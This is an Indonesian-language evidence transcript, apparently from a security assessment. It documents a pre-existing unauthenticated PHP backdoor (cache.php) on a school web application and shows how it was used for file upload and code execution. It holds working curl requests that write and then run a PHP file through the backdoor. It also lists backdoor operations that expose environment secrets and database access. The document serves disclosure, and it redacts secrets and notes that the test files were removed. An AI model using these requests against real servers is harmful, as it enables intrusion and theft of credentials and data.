@@ -1,0 +1,39 @@
+# F6 — Backdoor cache.php + unauthenticated upload -> RCE
+# Transkrip bukti (redacted). Diambil 26 Oktober 2026.
+# Rahasia (APP_KEY, kredensial DB, token) dan PII dihilangkan.
+
+## 1. Panel backdoor merespons tanpa autentikasi
+$ curl -s 'https://www.pedagogiai.smpm12gkb.sch.id/assets/Cache/cache.php' | head -c 120
+{"ok":true,"php":"8.3.36","sapi":"litespeed","user":"u5768******", ... }
+
+## 2. op=write menerima path absolut (tanpa auth, tanpa filter ekstensi)
+$ curl -s -X POST 'https://www.pedagogiai.smpm12gkb.sch.id/assets/Cache/cache.php' \
+    --data-urlencode 'op=write' \
+    --data-urlencode 'f=/home/u5*******/domains/pedagogiai.smpm12gkb.sch.id/public_html/public/assets/Cache/poc_<ts>.php' \
+    --data-urlencode 'content=<?php echo "UPLOAD_POC_OK"; ?>'
+{"ok":true,"bytes":179,...}
+
+## 3. Berkas hasil unggah dieksekusi sebagai PHP
+$ curl -s 'https://www.pedagogiai.smpm12gkb.sch.id/assets/Cache/poc_<ts>.php'
+UPLOAD_POC_OK bytes=179 user=u5768****** php=8.3.36 sapi=litespeed cwd=/home/u5*******/.../public/assets/Cache
+
+## 4. Batas yang diuji
+- Unggah 1 MiB                  -> ok=true
+- Unggah biner 256 byte         -> sha256 identik (MATCH)
+- Unggah .dat lalu diambil      -> MATCH
+- Ekstensi gambar               -> 422 (di-proxy ke image optimizer), bukan jalur eksekusi
+- op=write via GET              -> 403 (WAF), via POST -> 200
+- op=cmd                        -> tidak mengeksekusi (disable_functions)
+- op=read pada .env             -> 403 (WAF); op=env -> 54 variabel (redacted), termasuk APP_KEY + kredensial DB
+- op=proxy / op=mkuser / op=wpadd ada di source Dashboard.php (tidak dieksekusi)
+
+## 5. Dampak terverifikasi
+- Eksekusi kode sebagai user hosting u5768****** (LiteSpeed/PHP 8.3.36)
+- op=sql: akses basis data Laravel, 166 tabel; users=36 baris; schools=1 baris
+- Pembacaan .env: APP_KEY=base64:REDACTED, DB_PASSWORD=REDACTED
+
+## 6. Catatan kejujuran
+Panel cache.php (dan NEXUS Dashboard.php) sudah ada sebelum pengujian — artefak
+aktor lain. Pengujian ini hanya membuktikan bahwa direktori web dapat ditulisi
+dan berkas PHP di dalamnya dieksekusi. Berkas uji yang dibuat selama pengujian
+telah dihapus (DEL-OK); tidak ada berkas persisten yang ditinggalkan.
